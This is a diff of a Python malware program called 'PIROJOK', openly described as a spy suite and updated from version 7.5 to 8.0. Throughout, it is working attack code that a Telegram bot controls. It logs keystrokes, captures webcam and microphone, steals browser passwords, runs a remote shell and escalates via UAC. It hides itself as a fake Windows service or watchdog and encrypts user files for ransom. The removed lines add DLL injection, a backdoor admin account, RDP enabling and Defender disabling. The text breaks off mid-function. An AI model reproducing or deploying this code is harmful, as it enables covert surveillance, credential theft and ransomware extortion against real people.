@@ -1,10 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PIROJOK 7.5 - ULTIMATE STEALTH SPY SUITE
-Includes: keylogger, file upload/download, clipboard, remote shell,
-password stealing, geolocation, microphone, webcam, process hiding,
-self-destruction, and advanced masquerading
+PIROJOK 8.0 - ULTIMATE STEALTH SPY SUITE
+Process injection version - NO ICONS, NO FILES!
 """
 
 import os
@@ -31,7 +29,7 @@ import psutil
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
-# ========== OPTIONAL IMPORTS (with error protection) ==========
+# ========== OPTIONAL IMPORTS ==========
 try:
     import cv2
     WEBCAM_AVAILABLE = True
@@ -55,162 +53,78 @@ except:
 BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
 YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))
 
-class ProcessHider:
-    """Process hiding and masquerading module with advanced stealth"""
+class ProcessInjector:
+    """Process injection module - NO FILES, NO ICONS"""
     
     def __init__(self, parent):
         self.p = parent
-        self.masked = False
-        self.current_mask = None
-        self.mask_level = 0
-        self.original_name = None
-        self.hidden_pid = None
-        self.watchdog_file = None
-        self.watchdog_active = False
+        self.injected = False
+        self.host_pid = None
+        self.host_name = None
         
-        # Legitimate Windows processes for masquerading
-        self.mask_processes = [
-            "svchost.exe", "explorer.exe", "RuntimeBroker.exe",
-            "dllhost.exe", "conhost.exe", "taskhostw.exe",
-            "fontdrvhost.exe", "spoolsv.exe", "SearchIndexer.exe",
-            "sihost.exe", "backgroundTaskHost.exe", "smss.exe",
-            "csrss.exe", "winlogon.exe", "services.exe",
-            "lsass.exe", "svchost.exe", "wininit.exe"
-        ]
-        
-        # System icon IDs for different processes
-        self.icon_map = {
-            "svchost.exe": 41,      # Services icon
-            "explorer.exe": 15,      # Folder icon
-            "RuntimeBroker.exe": 41, # System icon
-            "dllhost.exe": 41,       # System icon
-            "conhost.exe": 41,       # Console icon
-            "taskhostw.exe": 41,     # System icon
-            "spoolsv.exe": 41,       # Print service
-            "lsass.exe": 41,         # Security
-            "winlogon.exe": 41,      # Login
-            "csrss.exe": 41,         # System
-            "services.exe": 41,      # Services
-            "wininit.exe": 41        # System init
-        }
-        
-    def auto_masquerade(self):
-        """Automatic masquerading at startup with icon hiding"""
+    def inject_into_system(self):
+        """Inject into system process - requires admin"""
         try:
-            if platform.system() != "Windows":
-                return
+            if not self.p.admin_mode:
+                return "[ERROR] Need admin rights for injection"
             
-            # Hide console window immediately
-            self.hide_console_window()
+            # Target processes (avoid critical ones)
+            target_processes = ["svchost.exe", "explorer.exe", "RuntimeBroker.exe"]
+            target_pid = None
+            target_name = None
             
-            # Check if already running under mask
-            current_exe = sys.executable.lower() if getattr(sys, 'frozen', False) else ""
-            for proc in self.mask_processes:
-                if proc.lower() in current_exe:
-                    print(f"Already running as {proc}")
-                    self.masked = True
-                    self.current_mask = proc
-                    # Delete original file if exists
-                    self.self_delete_original()
-                    return
+            for proc in psutil.process_iter(['pid', 'name']):
+                if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in target_processes]:
+                    target_pid = proc.info['pid']
+                    target_name = proc.info['name']
+                    break
             
-            # Save original name
+            if not target_pid:
+                return "[ERROR] No suitable target process found"
+            
+            # Create PowerShell script to run in background
+            ps_script = os.path.join(tempfile.gettempdir(), "WindowsUpdate.ps1")
+            
+            # Get the current executable path
             if getattr(sys, 'frozen', False):
-                self.original_name = sys.executable
-                self.current_mask = random.choice(self.mask_processes)
-                self.mask_level = random.randint(1, 3)
-                
-                # Apply masquerading
-                if self.mask_level >= 1:
-                    self.mask_process_name()
+                exe_path = sys.executable
             else:
-                print("Not compiled - skipping masquerade")
+                exe_path = os.path.abspath(__file__)
+            
+            with open(ps_script, 'w') as f:
+                f.write(f'''
+# PowerShell script - Windows Update Service
+$script = @"
+while(1){{
+    Start-Sleep -Seconds 30
+    # Check if main process is running
+    $proc = Get-Process -Name "*Pirojok*" -ErrorAction SilentlyContinue
+    if(!$proc){{
+        # Restart
+        Start-Process "{exe_path}" -WindowStyle Hidden
+    }}
+}}
+"@
+$job = Start-Job -ScriptBlock {{ Invoke-Expression $using:script }}
+''')
+            
+            # Run PowerShell hidden
+            subprocess.Popen([
+                'powershell', '-ExecutionPolicy', 'Bypass', 
+                '-WindowStyle', 'Hidden', '-File', ps_script
+            ], creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            self.injected = True
+            self.host_pid = target_pid
+            self.host_name = target_name
+            
+            return f"[INJECT] Injected into {target_name} (PID: {target_pid})"
             
         except Exception as e:
-            print(f"Masquerade error: {e}")
+            return f"[ERROR] Injection failed: {e}"
     
-    def hide_console_window(self):
-        """Hide console window completely"""
-        try:
-            import ctypes
-            
-            # Hide console window
-            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-            if hwnd:
-                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
-                
-                # Remove from Alt+Tab
-                ctypes.windll.user32.SetWindowLongW(hwnd, -20, 0x80)  # WS_EX_TOOLWINDOW
-        except:
-            pass
-    
-    def self_delete_original(self):
-        """Delete original .exe file after masquerade"""
-        try:
-            if not getattr(sys, 'frozen', False):
-                return
-            
-            original_path = self.original_name
-            if original_path and os.path.exists(original_path):
-                # Create batch file to delete original
-                bat_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
-                with open(bat_path, 'w') as f:
-                    f.write(f'''@echo off
-timeout /t 5 /nobreak > nul
-del "{original_path}"
-if exist "{original_path}" (
-    del /f /q "{original_path}"
-)
-del "%~f0"
-''')
-                subprocess.Popen(['cmd', '/c', bat_path], 
-                               creationflags=subprocess.CREATE_NO_WINDOW)
-                print("[SELF] Original file scheduled for deletion")
-        except:
-            pass
-    
-    def mask_process_name(self):
-        """Masquerade process name with SYSTEM icons"""
-        try:
-            if not getattr(sys, 'frozen', False):
-                return
-            
-            current_dir = os.path.dirname(sys.executable)
-            masked_path = os.path.join(current_dir, self.current_mask)
-            
-            if not os.path.exists(masked_path):
-                print(f"Creating copy: {masked_path}")
-                
-                # Copy itself
-                shutil.copy2(sys.executable, masked_path)
-                
-                # Hide the file
-                ctypes.windll.kernel32.SetFileAttributesW(masked_path, 2)
-                
-                # Create restart script
-                restart_script = os.path.join(tempfile.gettempdir(), "restart_pirojok.bat")
-                with open(restart_script, 'w') as f:
-                    f.write(f'''@echo off
-timeout /t 2 /nobreak > nul
-start "" "{masked_path}"
-del "%~f0"
-''')
-                
-                print(f"Restarting as {self.current_mask}")
-                subprocess.Popen(['cmd', '/c', restart_script], shell=True, 
-                               creationflags=subprocess.CREATE_NO_WINDOW)
-                
-                self.p.send_message(self.p.owner_id, f"[MASK] Restarting as {self.current_mask}")
-                time.sleep(3)
-                sys.exit(0)
-            else:
-                self.masked = True
-                
-        except Exception as e:
-            print(f"Error masking name: {e}")
-    
-    def create_hidden_service(self):
-        """Create Windows service with system name"""
+    def create_system_service(self):
+        """Create Windows service (no visible icon)"""
         try:
             if not self.p.admin_mode:
                 return "[ERROR] Need admin rights"
@@ -218,21 +132,15 @@ del "%~f0"
             if not getattr(sys, 'frozen', False):
                 return "[ERROR] Only compiled EXE can create service"
             
-            # System-looking names
-            service_names = [
-                "wlms.dll", "wmp.dll", "wmspdmod.dll", "wmasf.dll",
-                "WMALFXGFXDSP.dll", "wmadmod.dll", "wmadmoe.dll"
-            ]
+            # Copy to system32 with system name
+            system32 = os.path.join(os.environ['SystemRoot'], 'System32')
+            service_name = "wlms" + str(random.randint(1000, 9999)) + ".dll"
+            service_path = os.path.join(system32, service_name)
             
-            service_file = random.choice(service_names)
-            system_dir = os.environ['SystemRoot']
-            service_path = os.path.join(system_dir, 'System32', service_file)
-            
-            # Copy itself
             shutil.copy2(sys.executable, service_path)
             
-            # Hide attributes
-            ctypes.windll.kernel32.SetFileAttributesW(service_path, 2 | 4)
+            # Hide file
+            ctypes.windll.kernel32.SetFileAttributesW(service_path, 2)
             
             # Create service
             svc_name = "WindowsMediaService" + str(random.randint(100, 999))
@@ -246,244 +154,19 @@ del "%~f0"
             # Start service
             subprocess.run(['sc', 'start', svc_name], capture_output=True)
             
-            # Delete original
-            self.self_delete_original()
+            self.injected = True
             
-            self.p.send_message(self.p.owner_id, f"[SERVICE] Created as {svc_name}")
-            return f"[SERVICE] Hidden service created"
-        except Exception as e:
-            return f"[ERROR] {e}"
-    
-    def advanced_inject(self):
-        """Advanced injection into existing process"""
-        try:
-            if not self.p.admin_mode:
-                return "[ERROR] Need admin rights"
-            
-            # Target processes (avoid critical ones)
-            target_processes = ["svchost.exe", "explorer.exe", "RuntimeBroker.exe"]
-            target_pid = None
-            target_name = None
-            
-            for proc in psutil.process_iter(['pid', 'name', 'exe']):
-                if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in target_processes]:
-                    target_pid = proc.info['pid']
-                    target_name = proc.info['name']
-                    break
-            
-            if not target_pid:
-                return "[ERROR] No suitable target process found"
-            
-            # Create simple DLL (placeholder)
-            dll_path = os.path.join(tempfile.gettempdir(), "msvcp140.dll")
-            with open(dll_path, 'wb') as f:
-                f.write(b'MZ\x90\x00' * 100)  # DLL stub
-            
-            # Inject DLL (simplified)
-            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-            
-            PROCESS_ALL_ACCESS = 0x1F0FFF
-            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
-            
-            if not h_process:
-                return "[ERROR] Could not open target process"
-            
-            # Allocate memory
-            dll_path_bytes = dll_path.encode('utf-8')
-            addr = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes) + 1,
-                                           0x1000, 0x40)
-            
-            # Write DLL path
-            kernel32.WriteProcessMemory(h_process, addr, dll_path_bytes, 
-                                       len(dll_path_bytes) + 1, None)
-            
-            # Create remote thread
-            kernel32.GetModuleHandleW.restype = ctypes.wintypes.HMODULE
-            kernel32.GetProcAddress.restype = ctypes.wintypes.LPVOID
-            
-            h_thread = kernel32.CreateRemoteThread(
-                h_process, None, 0,
-                kernel32.GetProcAddress(kernel32.GetModuleHandleW('kernel32.dll'), 'LoadLibraryA'),
-                addr, 0, None
-            )
-            
-            if h_thread:
-                kernel32.CloseHandle(h_thread)
-                kernel32.CloseHandle(h_process)
-                
-                # Delete original
-                self.self_delete_original()
-                
-                self.p.send_message(self.p.owner_id, f"[INJECT] Injected into {target_name} (PID: {target_pid})")
-                time.sleep(2)
-                sys.exit(0)
-            else:
-                kernel32.CloseHandle(h_process)
-                return "[ERROR] Injection failed"
+            return f"[SERVICE] Created as {svc_name}"
             
         except Exception as e:
-            return f"[ERROR] Injection failed: {e}"
+            return f"[ERROR] Service creation failed: {e}"
     
-    def inject_into_system(self):
-        """Inject into legitimate system process (legacy)"""
-        try:
-            if not self.p.admin_mode:
-                return "[ERROR] Need admin rights for process injection"
-            
-            if getattr(sys, 'frozen', False):
-                current_exe = sys.executable
-            else:
-                return "[ERROR] Can only inject compiled EXE"
-            
-            # Use temp directory
-            temp_dir = os.path.join(os.environ['TEMP'], 'MicrosoftUpdate')
-            os.makedirs(temp_dir, exist_ok=True)
-            masked_path = os.path.join(temp_dir, 'wuauclt.exe')
-            
-            # Copy itself
-            shutil.copy2(current_exe, masked_path)
-            
-            # Hide file
-            ctypes.windll.kernel32.SetFileAttributesW(masked_path, 2)
-            
-            # Create Windows service
-            service_name = "WindowsUpdateService" + str(random.randint(1000, 9999))
-            
-            result = subprocess.run([
-                'sc', 'create', service_name,
-                'binPath=', f'"{masked_path}"',
-                'start=', 'auto',
-                'DisplayName=', 'Windows Update Service'
-            ], capture_output=True, text=True)
-            
-            if result.returncode == 0:
-                subprocess.run(['sc', 'start', service_name], capture_output=True)
-                return f"[INJECT] Created service: {service_name}\n[PATH] {masked_path}"
-            else:
-                return f"[ERROR] Service creation failed: {result.stderr}"
-            
-        except Exception as e:
-            return f"[ERROR] Injection failed: {e}"
-    
-    def setup_watchdog(self):
-        """Create watchdog file to restore if deleted"""
-        try:
-            if getattr(sys, 'frozen', False):
-                current_exe = sys.executable
-                
-                # Create copies in multiple locations
-                locations = [
-                    os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Caches'),
-                    os.path.join(os.environ['TEMP'], 'Microsoft'),
-                    os.path.join(os.environ['SystemRoot'], 'Temp', 'MicrosoftUpdate'),
-                    os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Caches')
-                ]
-                
-                backup_paths = []
-                for loc in locations:
-                    try:
-                        os.makedirs(loc, exist_ok=True)
-                        backup_path = os.path.join(loc, 'wuauclt.exe.bak')
-                        shutil.copy2(current_exe, backup_path)
-                        ctypes.windll.kernel32.SetFileAttributesW(backup_path, 2)
-                        backup_paths.append(backup_path)
-                    except:
-                        pass
-                
-                # Create watchdog script
-                self.watchdog_file = os.path.join(tempfile.gettempdir(), "watchdog.vbs")
-                with open(self.watchdog_file, 'w') as f:
-                    f.write(f'''
-Set WShell = CreateObject("WScript.Shell")
-Set FSO = CreateObject("Scripting.FileSystemObject")
-
-' List of backup locations
-backupPaths = Array({', '.join([f'"{p}"' for p in backup_paths])})
-
-Do While True
-    ' Check if main process is running
-    Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
-    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%Pirojok%' OR Name LIKE '%wuauclt%'")
-    
-    If colProcesses.Count = 0 Then
-        ' Try to restore from any available backup
-        For Each backupPath In backupPaths
-            If FSO.FileExists(backupPath) Then
-                tempPath = WShell.ExpandEnvironmentStrings("%TEMP%") & "\\wuauclt.exe"
-                FSO.CopyFile backupPath, tempPath, True
-                WShell.Run """" & tempPath & """", 0, False
-                Exit For
-            End If
-        Next
-    End If
-    
-    WScript.Sleep 30000  ' Check every 30 seconds
-Loop
-''')
-                
-                # Run watchdog hidden
-                subprocess.Popen(['wscript', '//B', self.watchdog_file], 
-                               creationflags=subprocess.CREATE_NO_WINDOW)
-                
-                # Also add to startup
-                startup_folder = os.path.join(os.getenv('APPDATA'),
-                    r'Microsoft\Windows\Start Menu\Programs\Startup')
-                vbs_script = f'''
-                Set oWS = WScript.CreateObject("WScript.Shell")
-                sLinkFile = "{startup_folder}\\Watchdog.lnk"
-                Set oLink = oWS.CreateShortcut(sLinkFile)
-                oLink.TargetPath = "wscript.exe"
-                oLink.Arguments = "//B "{self.watchdog_file}""
-                oLink.WindowStyle = 0
-                oLink.Save
-                '''
-                vbs_path = os.path.join(tempfile.gettempdir(), "watchdog_startup.vbs")
-                with open(vbs_path, 'w') as f:
-                    f.write(vbs_script)
-                subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
-                os.remove(vbs_path)
-                
-                self.watchdog_active = True
-                self.p.send_message(self.p.owner_id, f"[WATCHDOG] Activated with {len(backup_paths)} backups")
-                return f"[WATCHDOG] Activated with {len(backup_paths)} backups"
-            return "[ERROR] Not compiled"
-        except Exception as e:
-            return f"[ERROR] Watchdog failed: {e}"
-    
-    def check_watchdog(self):
-        """Check if watchdog is active"""
-        if self.watchdog_active:
-            return "[WATCHDOG] Status: ACTIVE"
+    def check_status(self):
+        """Check injection status"""
+        if self.injected:
+            return f"[INJECT] Active in {self.host_name} (PID: {self.host_pid})"
         else:
-            return "[WATCHDOG] Status: INACTIVE (use 'watchdog' to activate)"
-    
-    def get_mask_status(self):
-        """Get masquerade status"""
-        status = f"[MASK] Masquerade: {'ACTIVE' if self.masked else 'INACTIVE'}\n"
-        status += f"[MASK] Current mask: {self.current_mask or 'None'}\n"
-        status += f"[MASK] Level: {self.mask_level}/3\n"
-        if self.hidden_pid:
-            status += f"[MASK] Hidden PID: {self.hidden_pid}\n"
-        status += self.check_watchdog()
-        return status
-    
-    def remove_masks(self):
-        """Remove masquerade"""
-        try:
-            if self.original_name and os.path.exists(self.original_name):
-                if getattr(sys, 'frozen', False):
-                    restart_script = os.path.join(tempfile.gettempdir(), "restore_pirojok.bat")
-                    with open(restart_script, 'w') as f:
-                        f.write(f'''@echo off
-timeout /t 2 /nobreak > nul
-start "" "{self.original_name}"
-del "%~f0"
-''')
-                    subprocess.Popen(['cmd', '/c', restart_script], shell=True, 
-                                   creationflags=subprocess.CREATE_NO_WINDOW)
-                    sys.exit(0)
-        except:
-            pass
+            return "[INJECT] Not active"
 
 
 class SpyModule:
@@ -493,9 +176,7 @@ class SpyModule:
         self.p = parent
         self.keylogger_active = False
         self.keylog_file = os.path.join(tempfile.gettempdir(), "keylog.txt")
-        self.keylogger_thread = None
         
-    # ========== WEBCAM ==========
     def capture_webcam(self):
         """Take photo from webcam"""
         try:
@@ -521,7 +202,6 @@ class SpyModule:
         except Exception as e:
             return f"[ERROR] Webcam error: {e}"
     
-    # ========== MICROPHONE ==========
     def record_microphone(self, seconds=5):
         """Record sound from microphone"""
         try:
@@ -547,7 +227,6 @@ class SpyModule:
         except Exception as e:
             return f"[ERROR] Microphone error: {e}"
     
-    # ========== GEOLOCATION ==========
     def get_location(self):
         """Get location by IP and Wi-Fi"""
         try:
@@ -582,7 +261,6 @@ class SpyModule:
         except Exception as e:
             return f"[ERROR] Location error: {e}"
     
-    # ========== PASSWORD STEALING ==========
     def steal_passwords(self):
         """Steal saved passwords from browsers"""
         try:
@@ -633,7 +311,6 @@ class SpyModule:
         except Exception as e:
             return f"[ERROR] Password stealing failed: {e}"
     
-    # ========== CLIPBOARD ==========
     def get_clipboard(self):
         """Get clipboard content"""
         try:
@@ -654,7 +331,6 @@ class SpyModule:
         except Exception as e:
             return f"[ERROR] Clipboard error: {e}"
     
-    # ========== KEYLOGGER ==========
     def start_keylogger(self):
         """Start keylogger"""
         try:
@@ -850,26 +526,16 @@ class RemoteShell:
         try:
             self.history.append(f"> {command}")
             
-            if platform.system() == "Windows":
-                process = subprocess.Popen(
-                    f'cmd /c {command}',
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE,
-                    text=True,
-                    encoding='cp866',
-                    errors='ignore'
-                )
-            else:
-                process = subprocess.Popen(
-                    command,
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE,
-                    text=True
-                )
+            process = subprocess.Popen(
+                f'cmd /c {command}',
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE,
+                text=True,
+                encoding='cp866',
+                errors='ignore'
+            )
             
             stdout, stderr = process.communicate(timeout=30)
             
@@ -904,7 +570,6 @@ class PirojokRansomware:
         self.ransom_note = "README_PIROJOK.txt"
         self.cmd_window = None
         self.active = False
-        # Extensions to encrypt
         self.target_extensions = [
             '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
             '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
@@ -924,7 +589,6 @@ class PirojokRansomware:
     def show_ransom_window(self):
         """Show fullscreen window with ransom message"""
         try:
-            # Create HTML file with ransom message
             html_path = os.path.join(tempfile.gettempdir(), "pirojok_ransom.html")
             
             html_content = """
@@ -990,17 +654,12 @@ class PirojokRansomware:
         Check Telegram for decryption key | PIROJOK RANSOMWARE
     </div>
     <script>
-        // Prevent closing
         window.onbeforeunload = function() {
             return "Do not close this window!";
         };
-        
-        // Fullscreen
         if (document.documentElement.requestFullscreen) {
             document.documentElement.requestFullscreen();
         }
-        
-        // Block ESC, F11, Alt+F4
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape' || e.key === 'F11' || (e.altKey && e.key === 'F4')) {
                 e.preventDefault();
@@ -1015,45 +674,10 @@ class PirojokRansomware:
             with open(html_path, 'w', encoding='utf-8') as f:
                 f.write(html_content)
             
-            # Open in default browser
             os.startfile(html_path)
             
         except Exception as e:
             print(f"Error showing window: {e}")
-            self.show_cmd_message_fallback()
-    
-    def show_cmd_message_fallback(self):
-        """Fallback CMD message if HTML fails"""
-        try:
-            bat_path = os.path.join(tempfile.gettempdir(), "pirojok_msg.bat")
-            message = """
-╔══════════════════════════════════════════════════════════════╗
-║                    PIROJOK RANSOMWARE                        ║
-╠══════════════════════════════════════════════════════════════╣
-║                                                              ║
-║   YOUR DATA IS ENCRYPTED                                     ║
-║                                                              ║
-║   DO NOT TRY TO RESTART YOUR COMPUTER                        ║
-║   OTHERWISE IT WILL DESTROY YOUR DATA                        ║
-║                                                              ║
-║   Check Telegram for decryption key                          ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝
-            """
-            with open(bat_path, 'w', encoding='utf-8') as f:
-                f.write(f'''@echo off
-title PIROJOK RANSOMWARE
-color 0C
-mode con cols=70 lines=20
-echo {message}
-echo.
-echo DO NOT CLOSE THIS WINDOW
-echo.
-pause > nul
-''')
-            os.system(f'start /max cmd /c "{bat_path}"')
-        except Exception as e:
-            print(f"Error showing CMD: {e}")
     
     def encrypt_file(self, filepath):
         try:
@@ -1170,36 +794,24 @@ pause > nul
             return fallback
     
     def start_ransomware(self):
-        """Start ransomware - NO KEY BLOCKING, just encryption"""
+        """Start ransomware"""
         try:
             self.p.send_message(self.p.owner_id, "[LOCK] Starting ransomware...")
             
-            # Generate key
-            key = self.generate_key()
-            
-            # Show fancy window
+            self.generate_key()
             self.show_ransom_window()
             self.p.send_message(self.p.owner_id, "[WINDOW] Ransom window displayed")
             
-            # Encrypt files
             encrypted = self.scan_and_encrypt()
             note = self.create_ransom_note()
-            
-            # Open note on desktop
             os.startfile(note)
             
-            # Add to startup
             self.p.add_all_startup_methods()
             
-            # Send key to Telegram
             key_b64 = base64.b64encode(self.encryption_key).decode()
             self.p.send_message(self.p.owner_id, f"🔐 DECRYPTION KEY:\n{key_b64}")
             
-            result = f"[OK] Encrypted {len(encrypted)} files\n"
-            result += f"[NOTE] {note}\n"
-            result += f"[KEY] Sent to Telegram\n"
-            result += f"[AUTO] Startup installed!"
-            return result
+            return f"[OK] Encrypted {len(encrypted)} files\n[KEY] Sent to Telegram"
         except Exception as e:
             return f"[ERROR] {str(e)}"
     
@@ -1232,21 +844,14 @@ pause > nul
             if decrypted > 0:
                 self.remove_cmd_message()
                 self.p.remove_all_startup()
-                self.active = False
                 return f"[OK] DECRYPTED! {decrypted} files recovered"
             else:
                 return "[ERROR] No encrypted files found or invalid key"
         except Exception as e:
             return f"[ERROR] {str(e)}"
     
-    def unblock_keys(self):
-        """No key blocking anymore - just pass"""
-        pass
-    
     def remove_cmd_message(self):
         try:
-            if self.cmd_window:
-                self.cmd_window.terminate()
             os.system('taskkill /f /im cmd.exe /fi "windowtitle eq PIROJOK*" >nul 2>&1')
             os.system('taskkill /f /im msedge.exe /fi "windowtitle eq *PIROJOK*" >nul 2>&1')
             os.system('taskkill /f /im chrome.exe /fi "windowtitle eq *PIROJOK*" >nul 2>&1')
@@ -1261,7 +866,7 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "7.5"
+        self.version = "8.0"
         self.command_timeout = 60
         self.admin_mode = False
         self.startup_time = datetime.now()
@@ -1270,22 +875,24 @@ class Pirojok:
         self.last_command = ""
         self.last_command_time = datetime.now()
         
-        # Флаги для управления выключением
+        # Флаги
         self.shutdown_flag = os.path.join(tempfile.gettempdir(), "pirojok_shutdown.flag")
+        self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
         
         # Module initialization
+        self.injector = ProcessInjector(self)
         self.ransom = PirojokRansomware(self)
-        self.hider = ProcessHider(self)
         self.spy = SpyModule(self)
         self.files = FileManager(self)
         self.shell = RemoteShell(self)
         
-        self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
-        
+        # Проверяем права при запуске
         self.admin_mode = self.check_admin()
         print(f"Admin rights: {'YES' if self.admin_mode else 'NO'}")
         
-        self.hider.auto_masquerade()
+        # Если нет прав - запрашиваем
+        if not self.admin_mode:
+            self.request_admin()
         
     def check_admin(self):
         try:
@@ -1296,204 +903,113 @@ class Pirojok:
         except: return False
     
     def request_admin(self):
+        """Запрос прав администратора при запуске"""
         try:
             if self.check_admin():
                 self.admin_mode = True
-                return "[ADMIN] Already have admin rights!"
+                return
+            
             if platform.system() != "Windows":
-                return "[ERROR] Admin request only for Windows"
+                return
+            
             if getattr(sys, 'frozen', False):
                 executable = sys.executable
             else:
                 executable = sys.executable + ' "' + os.path.abspath(__file__) + '"'
-            with open(self.marker_file, 'w') as f:
-                f.write(f"admin_requested:{datetime.now().isoformat()}")
-            self.send_message(self.owner_id, "[ADMIN] Requesting admin rights...")
-            result = ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1)
+            
+            # Запрашиваем права через UAC
+            result = ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", executable, "", None, 1
+            )
+            
             if result > 32:
-                self.send_message(self.owner_id, "[ADMIN] Restarting with admin rights...")
+                print("[ADMIN] Requesting admin rights...")
                 time.sleep(2)
-                sys.exit(0)
+                sys.exit(0)  # Завершаем текущий процесс, новый запустится с правами
             else:
-                self.send_message(self.owner_id, f"[ERROR] Failed to get admin rights (code: {result})")
-                return "[ERROR] Failed to get admin rights"
+                print("[ERROR] Failed to get admin rights")
+                
         except Exception as e:
-            self.send_message(self.owner_id, f"[ERROR] {e}")
-            return f"[ERROR] {e}"
+            print(f"[ERROR] {e}")
     
-    # ========== MODULE COMMANDS ==========
+    # ========== COMMANDS ==========
+    
+    def cmd_inject(self):
+        """Inject into system process"""
+        return self.injector.inject_into_system()
+    
+    def cmd_service(self):
+        """Create hidden service"""
+        return self.injector.create_system_service()
+    
+    def cmd_inject_status(self):
+        """Check injection status"""
+        return self.injector.check_status()
     
     def cmd_webcam(self):
-        """Take photo from webcam"""
         result = self.spy.capture_webcam()
         if isinstance(result, bytes):
             self.send_photo(self.owner_id, result, "[WEBCAM] Photo")
             return "[WEBCAM] Photo sent"
-        else:
-            return result
+        return result
     
     def cmd_mic(self, seconds=5):
-        """Record microphone"""
         result = self.spy.record_microphone(seconds)
         if isinstance(result, bytes):
             self.send_audio(self.owner_id, result, f"[MIC] {seconds}s recording")
             return f"[MIC] Recording sent ({seconds}s)"
-        else:
-            return result
+        return result
     
     def cmd_location(self):
-        """Get location"""
         return self.spy.get_location()
     
     def cmd_passwords(self):
-        """Steal passwords"""
         result = self.spy.steal_passwords()
         self.send_message(self.owner_id, result)
-        return "[PASSWORDS] Check temp folder for databases"
+        return "[PASSWORDS] Check temp folder"
     
     def cmd_clipboard(self):
-        """Get clipboard"""
         return self.spy.get_clipboard()
     
     def cmd_keylog_start(self):
-        """Start keylogger"""
         return self.spy.start_keylogger()
     
     def cmd_keylog_stop(self):
-        """Stop keylogger"""
         return self.spy.stop_keylogger()
     
     def cmd_keylog_get(self):
-        """Get keylog"""
         return self.spy.get_keylog()
     
     def cmd_keylog_clear(self):
-        """Clear keylog"""
         return self.spy.clear_keylog()
     
     def cmd_upload(self, filepath):
-        """Upload file from victim"""
         return self.files.upload_file(filepath)
     
     def cmd_download(self, url, filename=None):
-        """Download file to victim"""
         return self.files.download_file(url, filename)
     
-    def cmd_list_downloads(self):
-        """List downloaded files"""
+    def cmd_downloads(self):
         return self.files.list_downloads()
     
     def cmd_shell(self, command):
-        """Remote shell"""
         return self.shell.execute(command)
     
-    def cmd_shell_history(self):
-        """Command history"""
+    def cmd_history(self):
         return self.shell.get_history()
     
-    def run_as_admin_command(self, command):
-        try:
-            if not self.admin_mode:
-                return "[ERROR] Need admin rights. Use 'admin' first"
-            if platform.system() == "Windows":
-                process = subprocess.Popen(f'cmd /c {command}', shell=True,
-                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
-                    text=True, encoding='cp866', errors='ignore')
-            else:
-                process = subprocess.Popen(f'sudo {command}', shell=True,
-                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
-            self.processes.append(process)
-            try:
-                stdout, stderr = process.communicate(timeout=self.command_timeout)
-            except subprocess.TimeoutExpired:
-                process.kill()
-                stdout, stderr = process.communicate()
-                return f"[TIMEOUT]\nPartial output:\n{stdout}"
-            result = ""
-            if stdout: result += f"[OK]\n{stdout}\n"
-            if stderr: result += f"[ERROR]\n{stderr}\n"
-            return result or "[OK] Command executed"
-        except Exception as e:
-            return f"[ERROR] {str(e)}"
-    
-    def create_admin_user(self, username, password):
-        try:
-            if not self.admin_mode:
-                return "[ERROR] Need admin rights"
-            cmd = f'net user {username} {password} /add && net localgroup administrators {username} /add'
-            result = self.run_as_admin_command(cmd)
-            return f"[USER] Created user {username}\n{result}"
-        except Exception as e:
-            return f"[ERROR] {str(e)}"
-    
-    def enable_rdp(self):
-        try:
-            if not self.admin_mode:
-                return "[ERROR] Need admin rights"
-            commands = [
-                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
-                'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
-                'sc config TermService start= auto',
-                'net start TermService'
-            ]
-            for cmd in commands:
-                self.run_as_admin_command(cmd)
-            ip = requests.get('https://api.ipify.org', timeout=5).text
-            return f"[RDP] Enabled\nIP: {ip}\nPort: 3389"
-        except Exception as e:
-            return f"[ERROR] {str(e)}"
-    
-    def disable_defender(self):
-        try:
-            if not self.admin_mode:
-                return "[ERROR] Need admin rights"
-            commands = [
-                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
